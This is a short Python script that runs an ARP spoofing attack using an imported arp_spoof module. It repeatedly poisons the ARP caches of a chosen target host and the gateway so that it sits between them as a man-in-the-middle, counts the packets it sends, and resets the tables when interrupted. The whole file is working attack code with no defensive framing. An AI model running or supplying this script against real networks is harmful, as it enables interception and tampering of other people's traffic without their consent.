import arp_spoof
import time

a_spoof = arp_spoof.ARP_Spoof()
args = a_spoof.get_args()
tgt_ip = args.tgt_ip
gateway_ip = args.gateway_ip

try:
    pkt_sent_count = 0
    while True:
        a_spoof.spoof(tgt_ip, gateway_ip)
        a_spoof.spoof(gateway_ip, tgt_ip)
        pkt_sent_count += 2
        print(f"\r[+] Packets sent: {pkt_sent_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Resetting ARP Tables...")
    a_spoof.restore_tables(tgt_ip, gateway_ip)
    a_spoof.restore_tables(gateway_ip, tgt_ip)
    print("\n[+] Quitting program...Cya!")